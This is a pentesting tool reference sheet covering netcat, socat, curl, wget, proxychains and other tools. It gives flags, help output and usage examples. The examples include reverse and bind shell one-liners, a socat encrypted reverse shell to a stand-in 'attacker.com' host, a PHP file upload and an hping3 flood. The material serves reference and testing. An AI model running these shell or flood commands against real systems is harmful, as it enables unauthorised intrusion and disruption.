# Miscellaneous Tools

## netcat (nc)
**Category:** Misc
**Description:** "The Swiss army knife of networking." Reads and writes data across network connections using TCP or UDP. Used for port scanning, file transfer, shells, and proxying.
**Version:** 1.10-50.1 (traditional netcat)
**Common Usage:** `nc <host> <port>` | `nc -l -p <port>`
**Key Flags:**
- `-l` — Listen mode (for inbound connections)
- `-p <port>` — Local port number
- `-e <program>` — Execute program after connect (enables bind/reverse shells)
- `-n` — Numeric IPs only (no DNS)
- `-v` — Verbose
- `-vv` — More verbose
- `-u` — UDP mode
- `-z` — Zero-I/O mode (port scanning)
- `-w <secs>` — Timeout for connects and final net reads
- `-k` — Set keepalive option on socket
- `-s <addr>` — Local source address
**Help Output:**
```
nc -h for help [v1.10-50.1]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
    -c shell commands   as `-e'; use /bin/sh to exec [dangerous!!]
    -e filename         program to exec after connect [dangerous!!]
    -b                  allow broadcasts
    -h                  this cruft
    -i secs             delay interval for lines sent, ports scanned
    -k                  set keepalive option on socket
    -l                  listen mode, for inbound connects
    -n                  numeric-only IP addresses, no DNS
    -o file             hex dump of traffic
    -p port             local port number
    -r                  randomize local and remote ports
    -q secs             quit after EOF on stdin and delay of secs
    -s addr             local source address
    -T tos              set Type Of Service
    -t                  answer TELNET negotiation
    -u                  UDP mode
    -v                  verbose [use twice to be more verbose]
    -w secs             timeout for connects and final net reads
    -C                  Send CRLF as line-ending
    -z                  zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive]
```

**Common usage examples:**
```bash
# Basic TCP connection
nc 192.168.1.1 80

# Listen for incoming connection
nc -l -p 4444

# Reverse shell (on victim, connects back to attacker)
nc -e /bin/bash 192.168.1.100 4444

# Bind shell (on victim, listens for attacker)
nc -l -p 4444 -e /bin/bash

# Port scan
nc -z -v 192.168.1.1 1-1000

# File transfer (receiver)
nc -l -p 4444 > received_file

# File transfer (sender)
nc 192.168.1.1 4444 < file_to_send

# Banner grabbing
echo "" | nc -w 1 192.168.1.1 80
```
---

## socat
**Category:** Misc
**Description:** Multipurpose relay tool — more powerful than netcat. Establishes two bidirectional streams and transfers data between them. Supports TCP, UDP, TLS, files, PTYs, and more.
**Version:** 1.8.1.0
**Common Usage:** `socat <address1> <address2>`
**Key Options:**
- `-v` — Verbose (data dump in human-readable)
- `-x` — Verbose hexadecimal dump
- `-d -d` — Increase verbosity (use twice for more)
- `-s` — Sloppy (continue on error)
- `-t <secs>` — Wait N seconds before closing second channel
- `-T <secs>` — Total inactivity timeout
- `-u` — Unidirectional mode (left to right)
- `4` / `-6` — Prefer IPv4 / IPv6
**Address Types:** TCP, TCP4, TCP6, UDP, UNIX, PIPE, FILE, EXEC, PTY, OPENSSL, STDIN/STDOUT
**Help Output:**
```
socat by Gerhard Rieger and contributors - www.dest-unreach.org
Usage:
socat [options] <bi-address> <bi-address>
   options:
      -V     print version and feature information to stdout, and exit
      -h|-?  print a help text describing command line options and addresses
      -hh    like -h, plus a list of all common address option names
      -hhh   like -hh, plus a list of all available address option names
      -d[ddd]        increase verbosity (use up to 4 times)
      -D     analyze file descriptors before loop
      -v     verbose text dump of data traffic
      -x     verbose hexadecimal dump of data traffic
      -r <file>      raw dump of data flowing from left to right
      -R <file>      raw dump of data flowing from right to left
      -b<size_t>     set data buffer size (8192)
      -s     sloppy (continue on error)
      -t<timeout>    wait seconds before closing second channel
      -T<timeout>    total inactivity timeout in seconds
      -u     unidirectional mode (left to right)
      -U     unidirectional mode (right to left)
      -4     prefer IPv4 if version is not explicitly specified
      -6     prefer IPv6 if version is not explicitly specified
```

**Common usage examples:**
```bash
# TCP listener (like nc -l -p 4444)
socat TCP-LISTEN:4444,reuseaddr -

# Connect to host (like nc host port)
socat - TCP:192.168.1.1:80

# Encrypted reverse shell (on victim)
socat OPENSSL:attacker.com:4444,verify=0 EXEC:/bin/bash

# Encrypted listener (on attacker) - need cert first
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0 -

# Port forwarding
socat TCP-LISTEN:8080,fork TCP:192.168.1.1:80

# File transfer (receiver)
socat TCP-LISTEN:4444,reuseaddr > file.txt

# File transfer (sender)
socat TCP:192.168.1.1:4444 < file.txt

# Create a PTY for full TTY shell
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
---

## curl
**Category:** Misc
**Description:** Command-line tool for transferring data with URLs. Supports HTTP, HTTPS, FTP, SFTP, SCP, and many other protocols.
**Version:** 8.18.0
**Common Usage:** `curl [options] <url>`
**Key Flags:**
- `-o <file>` — Write output to file
- `-O` — Write output to file named like remote
- `-s` — Silent mode (no progress bar)
- `-v` — Verbose (show headers and connection info)
- `-I` — Fetch headers only (HEAD request)
- `-i` — Include response headers in output
- `-L` — Follow redirects
- `-X <method>` — HTTP method (GET, POST, PUT, DELETE, etc.)
- `-d <data>` — POST data
- `-H <header>` — Custom header (e.g., `"Content-Type: application/json"`)
- `-u <user:pass>` — HTTP authentication
- `-A <agent>` — User-Agent string
- `-b <cookie>` — Send cookie
- `-c <file>` — Write cookies to file
- `-k` / `--insecure` — Skip TLS verification
- `--proxy <url>` — Use proxy
- `-x <url>` — Same as --proxy
- `--data-binary <data>` — POST binary data
- `-F <name=value>` — Multipart form data
- `--upload-file <file>` — HTTP PUT file upload
**Help Output:**
```
Usage: curl [options...] <url>
 -d, --data <data>           HTTP POST data
 -f, --fail                  Fail fast with no output on HTTP errors
 -h, --help <subject>        Get help for commands
 -o, --output <file>         Write to file instead of stdout
 -O, --remote-name           Write output to file named as remote file
 -i, --show-headers          Show response headers in output
 -s, --silent                Silent mode
 -T, --upload-file <file>    Transfer local FILE to destination
 -u, --user <user:password>  Server user and password
 -A, --user-agent <name>     Send User-Agent <name> to server
 -v, --verbose               Make the operation more talkative
 -V, --version               Show version number and quit

Use "--help category" to get an overview of all categories.
Use "--help all" to list all options.
```

**Common usage examples:**
```bash
# Basic GET request
curl http://target.com

# POST JSON data
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' http://target.com/api

# Download file
curl -o file.txt http://target.com/file.txt

# Follow redirects, show headers
curl -iL http://target.com

# Use proxy (e.g., Burp Suite)
curl -x http://127.0.0.1:8080 -k https://target.com

# HTTP auth brute attempt
curl -u admin:password http://target.com/admin

# Upload file
curl -T file.php http://target.com/uploads/

# Cookie-based auth
curl -b "session=abc123" http://target.com/dashboard
```
---

## wget
**Category:** Misc
**Description:** Non-interactive network downloader supporting HTTP, HTTPS, and FTP with support for recursive downloading.
**Version:** 1.25.0
**Common Usage:** `wget <url>` | `wget -r -np <url>` (recursive)
**Key Flags:**
- `-O <file>` — Output filename
- `-q` — Quiet mode
- `-v` — Verbose
- `-b` — Background download
- `-c` — Continue partial download
- `-r` — Recursive download
- `-np` — No parent directories (don't ascend to parent)
- `-p` — Download all page requisites (images, CSS, etc.)
- `-A <list>` — Accept only certain file types
- `-R <list>` — Reject certain file types
- `-l <depth>` — Maximum recursion depth
- `--no-check-certificate` — Skip SSL verification
- `--user=<user>` / `--password=<pass>` — HTTP auth
- `-e robots=off` — Ignore robots.txt
- `--limit-rate=<rate>` — Limit bandwidth (e.g., 100k)
- `--user-agent=<agent>` — Custom User-Agent
- `-U <agent>` — Shorthand for --user-agent
**Help Output:**
```
GNU Wget 1.25.0, a non-interactive network retriever.
Usage: wget [OPTION]... [URL]...

Startup:
  -V, --version                display the version of Wget and exit
  -h, --help                   print this help
  -b, --background             go to background after startup
  -e, --execute=COMMAND        execute a `.wgetrc'-style command

Logging and input file:
  -o, --output-file=FILE       log messages to FILE
  -q, --quiet                  quiet (no output)
  -v, --verbose                be verbose (this is the default)
  -i, --input-file=FILE        download URLs found in local or external FILE

Download:
  -t, --tries=NUMBER           set number of retries
  -O, --output-document=FILE   write documents to FILE
  -nc, --no-clobber            skip downloads to existing files
  -c, --continue               resume getting a partially-downloaded file
  -r, --recursive              specify recursive download
  -l, --level=NUMBER           specify recursion maximum depth level (inf or 0 for infinite)
  -np, --no-parent             don't ascend to the parent directory
  --limit-rate=RATE            limit download rate
```
---

## proxychains4
**Category:** Misc
**Description:** Tool that routes TCP connections through proxy chains (SOCKS4/5, HTTP). Allows any TCP-based application to use a proxy.
**Version:** 4.17
**Common Usage:** `proxychains4 <command> [args]` | `proxychains4 nmap -sT -Pn <target>`
**Key Flags:**
- `-q` — Quiet mode (suppress output)
- `-f <config>` — Specify config file
**Configuration:** Edit `/etc/proxychains4.conf`
- `dynamic_chain` — Use available proxies, skip dead ones
- `strict_chain` — All proxies must be available
- `random_chain` — Use random order
**Help Output:**
```
Usage:  proxychains4 -q -f config_file program_name [arguments]
    -q makes proxychains quiet - this overrides the config setting
    -f allows one to manually specify a configfile to use
    for example: proxychains telnet somehost.com
```

**Configuration example (`/etc/proxychains4.conf`):**
```
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5  127.0.0.1 1080
socks4  127.0.0.1 9050   # Tor
http    127.0.0.1 8080   # Burp Suite
```

**Common usage examples:**
```bash
# Route nmap through proxychains (must use -sT, not -sS)
proxychains4 nmap -sT -Pn -p 80,443,22 192.168.1.1

# Route any command through proxychains
proxychains4 curl http://target.com
proxychains4 ssh user@target.com
proxychains4 sqlmap -u http://target.com/page?id=1
```
---

## Additional Installed Utilities

### hping3
**Description:** TCP/IP packet assembler and analyzer. Used for firewall testing, port scanning, path MTU discovery, network performance testing, and covert channel testing.
**Common Usage:** `hping3 -S -p 80 <target>` | `hping3 --flood -S -p 80 <target>`

### macchanger
**Description:** Utility for manipulating MAC addresses.
**Common Usage:** `macchanger -r <interface>` (random MAC) | `macchanger -m <mac> <interface>`

### fping
**Description:** Faster ping that can ping multiple hosts simultaneously.
**Common Usage:** `fping -a -g 192.168.1.0/24` (scan live hosts in subnet)

### arping
**Description:** Send ARP REQUEST to a neighbor host.
**Common Usage:** `arping <target_ip>`

### traceroute
**Description:** Print the route packets trace to network host.
**Common Usage:** `traceroute <host>`

### sslscan
**Description:** Fast SSL/TLS scanner that queries SSL/TLS services for supported ciphers, protocols, and certificate details.
**Version:** 2.1.5
**Common Usage:** `sslscan <target>` | `sslscan --ssl2 <target>:443`

### sslyze
**Description:** Fast and full-featured SSL/TLS scanner.
**Version:** 6.3.0
**Common Usage:** `sslyze <target>`

### dnschef
**Description:** Highly configurable DNS proxy for pentesters and malware analysts.

### iodine
**Description:** DNS tunneling tool — tunnels IPv4 data over DNS.

### socat (see above)

### evil-winrm
**Description:** WinRM shell for hacking/pentesting.
**Common Usage:** `evil-winrm -i <ip> -u <user> -p <pass>`

### mitmproxy
**Description:** Interactive HTTPS proxy for intercepting, inspecting, modifying, and replaying web traffic.
**Version:** 12.2.1
**Access:** Web UI at http://127.0.0.1:8081 when running `mitmweb`

### certipy-ad
**Description:** Tool for Active Directory Certificate Services (AD CS) enumeration and attack.
**Version:** 5.0.4
**Common Usage:** `certipy find -u user@domain -p pass -dc-ip <DC_IP>`

### bloodhound.py
**Description:** Python-based BloodHound ingestor for Active Directory data collection.
**Version:** 1.9.0
**Common Usage:** `bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c all`

### radare2
**Description:** Open-source reverse engineering framework for analyzing binaries.
**Version:** 6.0.4
**Common Usage:** `r2 <binary>` (interactive) | `r2 -A -c "afl" <binary>` (analyze)
